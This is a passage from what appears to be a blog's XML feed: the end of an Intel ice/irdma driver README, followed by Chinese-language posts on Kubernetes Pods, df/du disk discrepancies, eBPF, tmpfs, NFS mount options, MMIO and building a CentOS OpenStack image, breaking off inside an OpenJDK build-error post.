<li><p>Some commands (such as ‘tc qdisc add’ and ‘ethtool -L’) will cause the ice<br>driver to close the associated RDMA interface and reopen it. This will disrupt<br>RDMA traffic for a few seconds until the RDMA interface is available again.</p>
</li>
<li><p>NOTE: Installing the ice driver, on RHEL, currently installs ice into initrd.<br>The implication is that the ice driver will be loaded on boot. The installation<br>process will also install any currently installed version of irdma into initrd.<br>This might result in an unintended version of irdma being installed. Depending<br>on your desired configuration and behavior of ice and irdma please look at the<br>following instructions to ensure the desired drivers are installed correctly.</p>
<p>  A. Desired that both ice and irdma are loaded on boot (default)</p>
<pre><code>  1. Follow installation procedure for the ice driver
  2. Follow installation procedure for the irdma driver</code></pre>
<p>  B. Desired that only ice driver is loaded on boot</p>
<pre><code>  1. Untar ice driver
  2. Follow installation procedure for ice driver
  3. Untar irdma driver
  4. Follow installation procedure for irdma driver
  5. % dracut --force --omit-drivers &quot;irdma&quot;</code></pre>
<p>  C. Desired that neither ice nor irdma is loaded on boot</p>
<pre><code>  1. Perform all steps in B
  2. % dracut --force --omit-drivers &quot;ice irdma&quot;</code></pre>
</li>
</ul>
<hr>
<h2 id="Support"><a href="#Support" class="headerlink" title="Support"></a>Support</h2><p>For general information, go to the Intel support website at:<br><a href="http://www.intel.com/support/" target="_blank" rel="noopener">http://www.intel.com/support/</a> or the Intel Wired Networking project<br>hosted by Sourceforge at: <a href="http://sourceforge.net/projects/e1000" target="_blank" rel="noopener">http://sourceforge.net/projects/e1000</a></p>
<p>If an issue is identified with the released source code on a supported kernel<br>with a supported adapter, email the specific information related to the issue<br>to <a href="mailto:&#x65;&#49;&#48;&#48;&#48;&#x2d;&#x72;&#x64;&#x6d;&#97;&#64;&#x6c;&#105;&#x73;&#116;&#x73;&#46;&#115;&#x6f;&#x75;&#114;&#99;&#101;&#x66;&#x6f;&#x72;&#x67;&#x65;&#46;&#x6e;&#x65;&#116;">&#x65;&#49;&#48;&#48;&#48;&#x2d;&#x72;&#x64;&#x6d;&#97;&#64;&#x6c;&#105;&#x73;&#116;&#x73;&#46;&#115;&#x6f;&#x75;&#114;&#99;&#101;&#x66;&#x6f;&#x72;&#x67;&#x65;&#46;&#x6e;&#x65;&#116;</a></p>
<hr>
<h2 id="License"><a href="#License" class="headerlink" title="License"></a>License</h2><p>This software is available to you under a choice of one of two<br>licenses. You may choose to be licensed under the terms of the GNU<br>General Public License (GPL) Version 2, available from the file<br>COPYING in the main directory of this source tree, or the<br>OpenFabrics.org BSD license below:</p>
<p>  Redistribution and use in source and binary forms, with or<br>  without modification, are permitted provided that the following<br>  conditions are met:</p>
<ul>
<li><p>Redistributions of source code must retain the above<br>copyright notice, this list of conditions and the following<br>disclaimer.</p>
</li>
<li><p>Redistributions in binary form must reproduce the above<br>copyright notice, this list of conditions and the following<br>disclaimer in the documentation and/or other materials<br>provided with the distribution.</p>
</li>
</ul>
<p>THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND,<br>EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF<br>MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND<br>NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS<br>BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN<br>ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN<br>CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE<br>SOFTWARE.</p>
<hr>
<h2 id="Trademarks"><a href="#Trademarks" class="headerlink" title="Trademarks"></a>Trademarks</h2><p>Intel is a trademark or registered trademark of Intel Corporation<br>or its subsidiaries in the United States and/or other countries.</p>
<ul>
<li>Other names and brands may be claimed as the property of others</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Kubernetes详解--Pod</title>
    <url>/2020/09/21/Kubernetes%E8%AF%A6%E8%A7%A3-Pod/</url>
    <content><![CDATA[<h3 id="（题外话：之前研究了好多开源软件，但是每当研究开源软件的时候，感觉了解的都不是很透彻，这次尝试研究官方文档，看看效果如何，下面的资料，是按照官方文档翻译的，比较笨，但是了解更深入了，希望能坚持下来-）"><a href="#（题外话：之前研究了好多开源软件，但是每当研究开源软件的时候，感觉了解的都不是很透彻，这次尝试研究官方文档，看看效果如何，下面的资料，是按照官方文档翻译的，比较笨，但是了解更深入了，希望能坚持下来-）" class="headerlink" title="（题外话：之前研究了好多开源软件，但是每当研究开源软件的时候，感觉了解的都不是很透彻，这次尝试研究官方文档，看看效果如何，下面的资料，是按照官方文档翻译的，比较笨，但是了解更深入了，希望能坚持下来**）**"></a><strong>（题外话：之前研究了好多开源软件，但是每当研究开源软件的时候，感觉了解的都不是很透彻，这次尝试研究官方文档，看看效果如何，下面的资料，是按照官方文档翻译的，比较笨，但是了解更深入了，希望能坚持下来**</strong>）**</h3><h3 id="1-1-1-POD"><a href="#1-1-1-POD" class="headerlink" title="1.1.1 POD"></a>1.1.1 POD</h3><p>一组容器（一个或者多个Container），共享存储，以相同的方式运行、Pods的容器位于同一节点，被一起调度，同时部署，启动、重启、删除，伸缩，运行在相同的Context。POD的模型对应 应用专属的逻辑主机，他包含一个或多个相对紧耦合的应用容器。PS：在使用容器之前，这些应用可能需要部署在相同的物理机或者虚拟机。</p>
<p>POD内Container共享的上下文包括：Linux Namespace、cgroups等（docker相关的隔离策略），在POD的上下文中，每个应用可能会有深层次的隔离</p>
<p>POD内的容器共享一个IP和PORT空间，容器可以通过localhost 互相发现，容器也可以通过标准的内部进程进行交互（System V semaphores 或者Posix 共享内存），不同POD内的容器具有不同的IP，无法通过IPC进行交互</p>
<p> POD内的容器可以访问共享卷，可以被挂载到每个应用的文件系统。</p>
<p>当POD所在节点挂掉后，该POD不会被重新调度到其他节点，而是一个新的POD在其他节点创建，uuid不同（将来版本，可能会提供迁移POD的功能），与POD同生命周期的概念，具体是指和该uuid pod的生命周期相同。</p>
<h3 id="1-1-2-POD-产生原因"><a href="#1-1-2-POD-产生原因" class="headerlink" title="1.1.2 POD 产生原因"></a>1.1.2 POD 产生原因</h3><p>l  管理，POD的模型可以理解为：由多个可以组成一个服务的协作进程的集合。这种模式提供了比Container更高一层的抽象，从而简化了部署和管理。POD作为部署、水平伸缩，副本的执行单元。POD内的Container统一调度、拥有一样的生命周期、一致的副本，资源共享、统一的依赖管理</p>
<p>l  资源共享和通信：POD资源Containers的资源共享和通信。POD中的Container的host name 和POD的name相同</p>
<p>POD虽然也可以部署一组垂直的容器，例如LAMP，但是POD的主要目的是用于以下程序:</p>
<p>1、 content management systems, file and data loaders, local cache managers, etc.</p>
<p>2、 log and checkpoint backup, compression, rotation, snapshotting, etc.</p>
<p>3、 data change watchers, log tailers, logging and monitoring adapters, event publishers, etc.</p>
<p>4、 proxies, bridges, and adapters</p>
<p>5、 controllers, managers, configurators, and updaters</p>
<h3 id="1-1-3-POD-删除"><a href="#1-1-3-POD-删除" class="headerlink" title="1.1.3 POD 删除"></a>1.1.3 POD 删除</h3><p>POD 代表一组运行的进程，所以应该能够优雅的终止这些进程（让这些进程能够执行一些数据清理，而不是直接kill），用户应能够请求删除POD，并指导什么时候该POD会被删除，并且能够确保POD内的进程最终被删除。当用户请求删除POD时，系统会记录可以允许该POD多久进行自我删除，超过该时间，TERM信号就会发送到POD内的全部容器。当POD正在删除过程中，Kubelete或者容器被重启，终止进程将会重新开始删除Pod（with full grace period）</p>
<p>一个删除流程的例子：</p>
<p>1．用户请求删除POD，默认的 grace period 是30s</p>
<p>2．API server更新该POD应该被删除的时间</p>
<p>3．当查询POD时，显示该POD “Terminating”</p>
<p>4．与第三步同步，当Kubelet发现Pod被标记为Terminating，kubelet开始关闭进程。</p>
<p>5．若Pod定义了 preStop hook，那么该hook会被激活，若该hook的运行时间超过了grace period，会再次执行第二步，grace period会变为30s+2s</p>
<p>6．发送TERM 信号到Pod内的进程</p>
<p>7．与第三步同时，POD将会从Service 的endpoint列表移除，但是关闭比较慢的POD 仍然可以进行服务访问（前提是svc没有被删除）</p>
<p>8．当grace period后，POD内仍然运行的进程都会收到SIGKILL信号</p>
<p>9．Kubelet在API server中设置grace period 为0 代表已经删除完成</p>
<p>默认情况下，POD会在30s内被删除，但是可以命令行设置该事件 通过 –grace-period=<seconds> ,0表示立即删除POD（这样该POD的名称可以尽快重复使用，但是该POD仍然会有一段比较小的grace period）</seconds></p>
<h3 id="1-1-4-Pod-的Privileged-模式"><a href="#1-1-4-Pod-的Privileged-模式" class="headerlink" title="1.1.4 Pod 的Privileged 模式"></a>1.1.4 Pod 的Privileged 模式</h3><p>K8s 1.1 版本以后，可以为Pod中的Container设置privileged模式，通过设置<strong>SecurityContext</strong> <strong>参数</strong></p>
]]></content>
      <tags>
        <tag>Kubernetes</tag>
        <tag>docker</tag>
        <tag>云计算</tag>
        <tag>Pod</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux执行df和du查看磁盘时占用结果不一致的解决办法</title>
    <url>/2020/09/21/Linux%E6%89%A7%E8%A1%8Cdf%E5%92%8Cdu%E6%9F%A5%E7%9C%8B%E7%A3%81%E7%9B%98%E6%97%B6%E5%8D%A0%E7%94%A8%E7%BB%93%E6%9E%9C%E4%B8%8D%E4%B8%80%E8%87%B4%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
    <content><![CDATA[<p><strong>问题现象</strong> </p>
<p>1、执行 df -h 查看 ECS Linux 实例文件系统使用率，可以看到 /dev/xvdb1 磁盘占用了约27G，挂载目录为 /opt 。</p>
<p><img src="http://p3.pstatp.com/large/pgc-image/1531049590662f3fa303a98" alt="Linux 执行 df 和 du 查看磁盘时占用结果不一致的解决办法"></p>
<p>2、进入到 /opt 目录执行 du -sh ，显示空间总占用量约 2.4 G，即df 和du查看到的结果不一致。</p>
<p><img src="http://p1.pstatp.com/large/pgc-image/1531049590682d3db0a9740" alt="Linux 执行 df 和 du 查看磁盘时占用结果不一致的解决办法"></p>
<p><strong>原因分析</strong></p>
<ul>
<li><p>du 命令对统计文件逐个进行 fstat 系统调用，获取文件大小。它的数据是基于文件获取，可以跨多个分区操作。</p>
</li>
<li><p>df 命令使用 statfs 系统调用，直接读取分区的超级块信息获取分区使用情况。它的数据基于分区元数据，只能针对整个分区。</p>
</li>
<li><p>用户删除了大量的文件后，du 就不会在文件系统目录中统计这些文件。如果此时还有运行中的进程持有这个已经被删除的文件句柄，那么这个文件就不会真正在磁盘中被删除，分区超级块中的信息也就不会更改，df 仍会统计这个被删除的文件。</p>
</li>
<li><p>通过 lsof 查询处于 deleted 状态的文件，被删除的文件在系统中被标记为 deleted 。如果系统有大量 deleted 状态的文件，会导致 du 和 df 统计结果不一致。</p>
</li>
</ul>
<p>##解决方案<br>  1、根据 lsof 列出的 pid，kill 相应进程或者重启相应的服务，如：#kill -9 692。 </p>
<p>  2、重启服务器。重启服务器系统会退出现有的进程，开机后重新加载，过程中会释放调用的 deleted 文件的句柄。</p>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux eBPF介绍</title>
    <url>/2021/01/26/Linux-eBPF%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h2 id="eBPF的介绍"><a href="#eBPF的介绍" class="headerlink" title="eBPF的介绍"></a>eBPF的介绍</h2><p>eBPF源于早年间的成型于 BSD 之上的传统技术 BPF(Berkeley Packet Filter)。BPF 的全称是 Berkeley Packet Filter，顾名思义，这是一个用于过滤(filter)网络报文(packet)的架构。BPF 是在 1997 年首次被引入 Linux 的，Linux 内核中的报文过滤机制其实是有自己的名字的：Linux Socket Filter，简称 LSF。从 3.15 开始，一个套源于 BPF 的全新设计开始，在3.17被添置到了 kernel/bpf 下。全新设计最终被命名为了 extended BPF(eBPF)；为了后向兼容，传统的 BPF 仍被保留了下来，并被重命名为 classical BPF(cBPF)。相对于 cBPF，eBPF 带来的改变可谓是革命性的：一方面，它已经为内核追踪(Kernel Tracing)、应用性能调优/监控、流控(Traffic Control)等领域带来了激动人心的变革；另一方面，在接口的设计以及易用性上，eBPF 也有了较大的改进。</p>
<p>cBPF 所覆盖的功能范围很简单，就是网络监控和 seccomp 两块，数据接口设计的粗放；而 eBPF 的利用范围要广的多，性能调优、内核监控、流量控制什么的，数据接口的多样性设计。</p>
<h2 id="使用eBPF可以做什么？"><a href="#使用eBPF可以做什么？" class="headerlink" title="使用eBPF可以做什么？"></a>使用eBPF可以做什么？</h2><p>一个eBPF程序会附加到指定的内核代码路径中，当执行该代码路径时，会执行对应的eBPF程序。鉴于它的起源，eBPF特别适合编写网络程序，将该网络程序附加到网络socket，进行流量过滤，流量分类以及执行网络分类器的动作。eBPF程序甚至可以修改一个已建链的网络socket的配置。XDP工程会在网络栈的底层运行eBPF程序，高性能地进行处理接收到的报文。从下图可以看到eBPF支持的功能，eBPF是一项革命性的技术，可以在Linux内核中运行沙盒程序，而无需更改内核源代码或加载内核模块。通过使Linux内核可编程，基础架构软件可以利用现有的层，从而使它们更加智能和功能丰富，而无需继续为系统增加额外的复杂性层。·</p>
<p>上个图，目前没有看明白</p>
<p> <img src="/2021/01/26/Linux-eBPF%E4%BB%8B%E7%BB%8D/2.jpg" alt="avatar"></p>
<h2 id="eBFP程序"><a href="#eBFP程序" class="headerlink" title="eBFP程序"></a>eBFP程序</h2><p>在很多情况下，不是直接使用eBPF，而是通过Cilium，bcc或bpftrace等项目间接使用eBPF，这些项目在eBPF之上提供了抽象，并且不需要直接编写程序，而是提供了指定基于意图的定义的功能，然后使用eBPF实施。如果不存在更高级别的抽象，则需要直接编写程序。 Linux内核希望eBPF程序以字节码的形式加载。虽然当然可以直接编写字节码，但更常见的开发实践是利用LLVM之类的编译器套件将伪C代码编译为eBPF字节码。</p>
<p>eBPF调用关系(运行架构)</p>
<p><img src="/2021/01/26/Linux-eBPF%E4%BB%8B%E7%BB%8D/3.jpg" alt="avatar"></p>
<h2 id="eBPF-项目"><a href="#eBPF-项目" class="headerlink" title="eBPF 项目"></a>eBPF 项目</h2><p>bpftrace项目，<a href="https://github.com/iovisor/bpftrace" target="_blank" rel="noopener">项目地址</a></p>
<p>bpftrace是Linux eBPF的高级跟踪语言。它的语言受awk和C以及DTrace和SystemTap等以前的跟踪程序的启发。 bpftrace使用LLVM作为后端将脚本编译为eBPF字节码，并利用BCC作为与Linux eBPF子系统以及现有Linux跟踪功能和连接点进行交互的库。</p>
<p>bcc项目，<a href="https://github.com/iovisor/bcc" target="_blank" rel="noopener">项目地址</a></p>
<p>现在可以用 C 来实现 BPF，但编译出来的却仍然是 ELF 文件，开发者需要手动析出真正可以注入内核的代码。这工作有些麻烦，于是就有人设计了 BPF Compiler Collection(BCC)，BCC 是一个 python 库，但是其中有很大一部分的实现是基于 C 和 C++的，python实现了对 BCC 应用层接口的封装。使用 BCC 进行 BPF 的开发仍然需要开发者自行利用 C 来设计 BPF 程序——但也仅此而已，余下的工作，包括编译、解析 ELF、加载 BPF 代码块以及创建 map 等等基本可以由 BCC 一力承担，无需多劳开发者费心</p>
<p>Cilium项目，<a href="https://github.com/cilium/cilium" target="_blank" rel="noopener">项目地址</a></p>
<p>Cilium是一个开源项目，提供基于eBPF的联网，安全性和可观察性。它是从头开始专门设计的，旨在将eBPF的优势带入Kubernetes的世界，并满足容器工作负载的新可伸缩性，安全性和可见性要求。</p>
]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux的tempfs</title>
    <url>/2020/12/01/Linux%E7%9A%84tempfs/</url>
    <content><![CDATA[<p>###tempfs简介</p>
<ol>
<li><p>tmpfs 是 Linux/Unix 系统上的一种基于内存的文件系统，即 tmpfs 使用内存或 swap 分区来存储文件。Linux 内核中的 VM 子系统负责在后台管理虚拟内存资源 Virtual Memory，即 RAM 和 swap 资源，透明地将 RAM 页移动到交换分区或从交换分区到 RAM 页，tmpfs 文件系统需要 VM 子系统的页面来存储文件。tmpfs 自己并不知道这些页面是在交换分区还是在 RAM 中；做这种决定是 VM 子系统的工作。tmpfs 文件系统所知道的就是它正在使用某种形式的虚拟内存。</p>
</li>
<li><p>由于 tmpfs 是基于内存的，因此速度是相当快的。另外 tmpfs 使用的 VM 资源是动态的，当删除 tmpfs 中文件，tmpfs 文件系统驱动程序会动态地减小文件系统并释放 VM 资源，当然在其中创建文件时也会动态的分配VM资源。另外，tmpfs 不具备持久性，重启后数据不保留。</p>
</li>
</ol>
<p>在Linux主机上，查看常用tempfs的目录如下所示</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@node2 ~]# df -h</span><br><span class="line">Filesystem                  Size  Used Avail Use% Mounted on</span><br><span class="line">&#x2F;dev&#x2F;mapper&#x2F;centos-root     442G   78G  364G  18% &#x2F;</span><br><span class="line">devtmpfs                     94G     0   94G   0% &#x2F;dev</span><br><span class="line">tmpfs                        94G     0   94G   0% &#x2F;dev&#x2F;shm</span><br><span class="line">tmpfs                        94G  1.2G   93G   2% &#x2F;run</span><br><span class="line">tmpfs                        94G     0   94G   0% &#x2F;sys&#x2F;fs&#x2F;cgroup</span><br></pre></td></tr></table></figure>
<p>1.其中/run 目录主要存放的是自系统启动以来描述系统信息的文件。比较常见的用途是 daemon 进程将自己的 pid 保存到这个目录。</p>
<p>2./dev/shm/ 是 Linux 下一个非常有用的目录，它的意思是 Shared memory，也就是共享内存。由于它在内存上，所以所有系统进程都能共享该目录。默认情况下它的大小是内存的一半</p>
]]></content>
  </entry>
  <entry>
    <title>NFS 硬挂载和软挂载</title>
    <url>/2021/02/07/NFS-%E7%A1%AC%E6%8C%82%E8%BD%BD%E5%92%8C%E8%BD%AF%E6%8C%82%E8%BD%BD/</url>
    <content><![CDATA[<h2 id="硬挂载"><a href="#硬挂载" class="headerlink" title="硬挂载"></a>硬挂载</h2><p>硬挂载通常用于块资源，例如本地磁盘或 SAN 。当 NFS 文件系统挂载是硬挂载时、会反复发出影响挂载资源任何部分的 NFS 请求、直到满足请求（例如，服务器崩溃并在以后重新启动）。服务器恢复联机后、程序将继续执行服务器崩溃期间不受干扰的状态。我们可以使用挂载选项 “INTR” 、该选项允许在服务器停机或无法访问时中断 NFS 请求。因此，建议的设置是硬设置和 INTR 选项。</p>
<p>优势： 如果连接丢失、则所有 NFS 客户端都将冻结、直到 NFS 服务器重新联机。因此不会丢失数据。确保数据完整性和消息传送。</p>
<p>缺点： 持续连接可能会对性能产生影响。</p>
<p>命令从远程计算机 host.server.com 在 mount -point/mymountpoint 上硬挂载目录 /home 。rw —表示已安装要进行读写的资源、以及为键盘中断启用 Intr 。 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount -o rw,hard,intr host.server.com&#x2F;home &#x2F;mymountpoint</span><br></pre></td></tr></table></figure>

<h1 id="软挂载"><a href="#软挂载" class="headerlink" title="软挂载"></a>软挂载</h1><p>软挂载通常用于 NFS 或 CIFS 等网络文件协议。当 NFS 文件系统挂载是软挂载时、程序或应用程序从 NFS 文件系统请求文件时、 NFS 客户端守护进程将尝试从 NFS 服务器检索数据。NFS 会反复尝试与服务器联系，直至已建立连接,满足 NFS 重试阈值,已达到nfstimeOut 值.如果发生其中一个事件， Control 将返回调用程序。但是，如果 NFS 服务器没有响应（由于 NFS 服务器的任何崩溃、超时或故障）、 NFS 客户端将向请求文件访问的客户端计算机上的进程报告错误、然后退出。</p>
<p>优势:  此机制的优点是“快速响应”、因为它不会等待 NFS 服务器响应。如果 NFS 服务器不可用、内核将在预配置的时间段后超时 I/O 操作。</p>
<p>劣势: 缺点是，如果 NFS 驱动程序缓存数据并且软挂载超时、应用程序可能不知道哪些写入 NFS 卷实际上是提交到磁盘的。<br>数据损坏或数据丢失。</p>
<p>在 mount -point/mymountpoint 上从远程计算机 host.server.com 执行软挂载的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount -o rw,soft host.server.com&#x2F;home &#x2F;mymountpoint</span><br></pre></td></tr></table></figure>

<p>要检查当前系统上存在的挂载类型，请执行以下操作：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[usero1@Linux01 ~]$ nfsstat -m</span><br><span class="line"></span><br><span class="line">&#x2F;home from vrouter:&#x2F;home</span><br><span class="line">Flags: rw,relatime,vers&#x3D;4.1,rsize&#x3D;262144,wsize&#x3D;262144,namlen&#x3D;255,hard,proto&#x3D;tcp,port&#x3D;0,timeo&#x3D;600,retrans&#x3D;2,sec&#x3D;sys,clientaddr&#x3D; 10.0.0.1,local_lock&#x3D;none,addr&#x3D;10.0.0.2</span><br><span class="line">&#x2F;mnt&#x2F;test from svm-data-lif1:&#x2F;vol_unix</span><br><span class="line">Flags: rw,relatime,vers&#x3D;4.0,rsize&#x3D;65536,wsize&#x3D;65536,namlen&#x3D;255,hard,proto&#x3D;tcp,port&#x3D;0,timeo&#x3D;600,retrans&#x3D;2,sec&#x3D;sys,clientaddr&#x3D; 10.0.0.1,local_lock&#x3D;none,addr&#x3D;10.0.0.2</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>MMIO内存映射IO</title>
    <url>/2022/05/18/MMIO%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84IO/</url>
    <content><![CDATA[<h2 id="啥是MMIO啊"><a href="#啥是MMIO啊" class="headerlink" title="啥是MMIO啊"></a>啥是MMIO啊</h2><p>MMIO（内存映射IO），是PCI规范的一部分，IO设备被在内存空间，而不是放在IO空间，处理器的角度看，内存映射I/O后系统设备访问起来和内存一样。这样访问AGP/PCI-E显卡上的帧缓存，BIOS，PCI设备就可以使用读写内存一样的汇编指令完成，简化了程序设计的难度和接口的复杂性。I/O作为CPU和外设交流的一个渠道，主要分为两种，一种是Port I/O，一种是MMIO(Memory mapping I/O),MMIO就是通过外围设备映射到内存空间，便于CPU的访问。I/O作为CPU和外设交流的一个渠道，主要分为两种，一种是Port I/O，一种是MMIO(Memory mapping I/O)。前者就是我们常说的I/O端口，它实际上的应该被称为I/O地址空间。</p>
<p>简而言之，MMIO就是通过将外围设备映射到内存空间，便于CPU的访问。</p>
<h2 id="PortIO和MMIO-的主要区别"><a href="#PortIO和MMIO-的主要区别" class="headerlink" title="PortIO和MMIO 的主要区别"></a>PortIO和MMIO 的主要区别</h2><ol>
<li><p>前者不占用CPU的物理地址空间，后者占有（这是对x86架构说的，一些架构，如IA64，port I/O占用物理地址空间）。</p>
</li>
<li><p>前者是顺序访问。也就是说在一条I/O指令完成前，下一条指令不会执行。例如通过Port I/O对设备发起了操作，造成了设备寄存器状态变化，这个变化在下一条指令执行前生效。uncache的MMIO通过uncahce memory的特性保证顺序性。</p>
</li>
<li><p>使用方式不同，由于port I/O有独立的64K I/O地址空间，但CPU的地址线只有一套，所以必须区分地址属于物理地址空间还是I/O地址空间。</p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>OpenStack Centos6.5 image 制作</title>
    <url>/2020/09/15/OpenStack-Centos6-5-image-%E5%88%B6%E4%BD%9C/</url>
    <content><![CDATA[<p>查找了很多资料，包括官方文档，几处资料结合起来终于制作好了Centos 6.5 的镜像。但是不能够进行硬盘伸缩，还待优化（但是个人觉得硬盘伸缩的作用不是很大，体验了阿里云、UnitedStack，都是固定了系统盘的大小（linux是20G、windows是40G的系统盘）） </p>
<p>1、使用ubuntu12.04 server 64bits，首先安装kvm</p>
<p>  sudo apt-get install kvm qemu libvirt-bin virtinst virt-manager virt-viewer</p>
<p>2、创建kvm 虚拟机磁盘文件：</p>
<p>     qemu-img create -f qcow2 centos.img 20G    //20G 是该虚拟机的硬盘大小</p>
<p>3、挂载iso，安装centos系统</p>
<p>    kvm -hda centos.img -cdrom /tmp/CentOS-6.5-x86_64-bin-DVD1.iso -m 768 -boot d -vnc :0<br>  使用vnc工具连接，在vnc中完成安装centos的操作。推荐使用TightVNC viewer。安装完成后，关闭虚拟机</p>
<p>4、启动虚拟机，配置网络</p>
<p>   kvm centos.img -m 768 -smp 2 -net nic -net tap,ifname=tap1,script=/etc/qemu-ifup -vnc :0 -daemonize</p>
<p>  登录系统后，eth0网卡未启动，需要设置eth0 开机启动 文件/etc/sysconfig/network-scripts/ifcfg-eth0 设置ONBOOT=“yes”</p>
<p>  重启网络</p>
<p>5、更新操作：</p>
<p>        yum update</p>
<p>       yum upgrade</p>
<p>6、网络配置</p>
<p> 在网络接口配置里面注释或删除这行 #HWADDR= 一行，启用 DHCP：</p>
<blockquote>
<blockquote>
<p># vi /etc/sysconfig/network-scripts/ifcfg-eth0</p>
</blockquote>
<blockquote>
<p>DEVICE=”eth0”</p>
</blockquote>
<blockquote>
<p>#UUID=fe8e2c29-a8d2-4529-accd-a5b4dabb892c</p>
</blockquote>
<blockquote>
<p>#HWADDR=”00:11:22:12:34:56”</p>
</blockquote>
<blockquote>
<p>NM_CONTROLLED=”yes”</p>
</blockquote>
<blockquote>
<p>BOOTPROTO=dhcp</p>
</blockquote>
<blockquote>
<p>ONBOOT=”yes”</p>
</blockquote>
</blockquote>
<p>修改sshd配置</p>
<blockquote>
<blockquote>
<p>sed -i ‘s/PasswordAuthentication no/PasswordAuthentication yes/g’ /etc/ssh/sshd_config </p>
</blockquote>
<blockquote>
<p>sed -i ‘s/#PasswordAuthentication yes /PasswordAuthentication yes /g’ /etc/ssh/sshd_config </p>
</blockquote>
<blockquote>
<p># vi /etc/ssh/sshd_config</p>
</blockquote>
<blockquote>
<p>…</p>
</blockquote>
<blockquote>
<p>PasswordAuthentication yes </p>
</blockquote>
<blockquote>
<p>RSAAuthentication yes</p>
</blockquote>
<blockquote>
<p>PubkeyAuthentication yes</p>
</blockquote>
<blockquote>
<p>ChallengeResponseAuthentication no</p>
</blockquote>
</blockquote>
<p>      service sshd restart</p>
<p>需要关闭 SELINUX </p>
<blockquote>
<blockquote>
<p># vi /etc/selinux/config</p>
</blockquote>
<blockquote>
<p>SELINUX=disabled</p>
</blockquote>
<blockquote>
<p>SELINUXTYPE=targeted</p>
</blockquote>
</blockquote>
<p> 关闭防火墙服务</p>
<blockquote>
<blockquote>
<p>service iptables stop &amp;&amp; chkconfig iptables off</p>
</blockquote>
<blockquote>
<p>service ip6tables stop &amp;&amp; chkconfig ip6tables off</p>
</blockquote>
</blockquote>
<p>清空文件（不是删除）：</p>
<blockquote>
<blockquote>
<p>/etc/udev/rules.d/70-persistent-net.rules</p>
</blockquote>
<blockquote>
<p>/lib/udev/rules.d/75-persistent-net-generator.rules</p>
</blockquote>
</blockquote>
<p> 7、安装cloud-init,cloud-utils, cloud-initramfs-growroot cloud-init</p>
<blockquote>
<p>rpm -ivh <a href="http://ftp-stud.hs-esslingen.de/pub/epel/6/x86/_64/epel-release-6-8.noarch.rpm" target="_blank" rel="noopener">http://ftp-stud.hs-esslingen.de/pub/epel/6/x86\_64/epel-release-6-8.noarch.rpm</a></p>
<p>yum install git parted cloud-utils  cloud-initramfs-growroot cloud-init</p>
</blockquote>
<p> 编辑/etc/cloud/cloud.cfg 文件,开启root 账号登陆：</p>
<blockquote>
<p> disable_root: 1</p>
<p> ssh_pwauth:   1</p>
</blockquote>
<p> 8、修改grub，是系统启动日志能够通过OpenStack控制台输出</p>
<p>   Vi  /boot/grub/grub.conf</p>
<p>   增加 console=ttyS0</p>
<blockquote>
<blockquote>
<p>default=0</p>
</blockquote>
<blockquote>
<p>timeout=5</p>
</blockquote>
<blockquote>
<p>splashimage=(hd0,0)/boot/grub/splash.xpm.gz</p>
</blockquote>
<blockquote>
<p>hiddenmenu</p>
</blockquote>
<blockquote>
<p>title CentOS (2.6.32-279.el6.x86_64)</p>
</blockquote>
<blockquote>
<p>        root (hd0,0)</p>
</blockquote>
<blockquote>
<p>        kernel /boot/vmlinuz-2.6.32-279.el6.x86_64 ro root=UUID=587a6161-e327-48b8-80a2-2fd5da0b3989 rd_NO_LUKS rd_NO_LVM LANG=en_US.UTF-8 rd_NO_MD SYSFONT=latarcyrheb-sun16 crashkernel=auto  KEYBOARDTYPE=pc KEYTABLE=us rd_NO_DM rhgb quiet console=tty0 console=ttyS0,115200n8</p>
</blockquote>
<blockquote>
<p>        initrd /boot/initramfs-2.6.32-279.el6.x86_64.img</p>
</blockquote>
</blockquote>
<p>现在就可以将centos.img 注册到OpenStack使用了。制作出来有2G，有需要的可以留言给我。</p>
]]></content>
      <tags>
        <tag>OpenStack</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenJdk移除sun.image.codec package</title>
    <url>/2020/09/04/OpenJdk%E7%A7%BB%E9%99%A4sun-image-codec-package/</url>
    <content><![CDATA[<p>问题描述</p>
<p>一个项目在windows下执行mvn package正常，但是放在Linux环境下，会出现找不到com.sun.image.codec的问题，如下所示</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[ERROR] COMPILATION ERROR : </span><br><span class="line">[INFO] -------------------------------------------------------------</span><br><span class="line">[ERROR] /home/ztzx/ztzx.service/src/main/java/com/telchina/ztzx/common/controller/UploadController2.java:[<span class="number">24</span>,<span class="number">40</span>] package com.sun.image.codec.jpeg does <span class="keyword">not</span> exist</span><br><span class="line">[ERROR] /home/ztzx/ztzx.service/src/main/java/com/telchina/ztzx/common/controller/UploadController2.java:[<span class="number">25</span>,<span class="number">40</span>] package com.sun.image.codec.jpeg does <span class="keyword">not</span> exist</span><br><span class="line">[ERROR] /home/ztzx/ztzx.service/src/main/java/com/telchina/ztzx/common/controller/UploadController.java:[<span class="number">25</span>,<span class="number">32</span>] package com.sun.image.codec.jpeg does <span class="keyword">not</span> exist</span><br><span class="line">[ERROR] /home/ztzx/ztzx.service/src/main/java/com/telchina/ztzx/common/controller/UploadController.java:[<span class="number">26</span>,<span class="number">32</span>] package 